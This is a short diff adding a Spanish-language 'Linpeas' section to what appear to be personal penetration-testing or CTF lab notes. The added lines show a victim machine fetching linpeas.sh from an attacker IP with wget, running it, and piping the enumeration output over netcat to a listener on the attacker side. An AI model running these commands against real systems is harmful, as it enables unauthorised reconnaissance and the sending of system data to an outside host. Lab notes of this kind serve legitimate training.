@@ -649,7 +649,19 @@ lsblk
 
 ```
 
+## Linpeas
 
+Para que analices en la maquina atacante
+
+```
+# Victima
+wget 10.10.14.80:8080/linpeas.sh
+./linpeas.sh |  nc 10.10.14.80 9002
+
+# Atacante
+nc -lvnp 9002 | tee linpeas.out 
+
+```
 
 
 
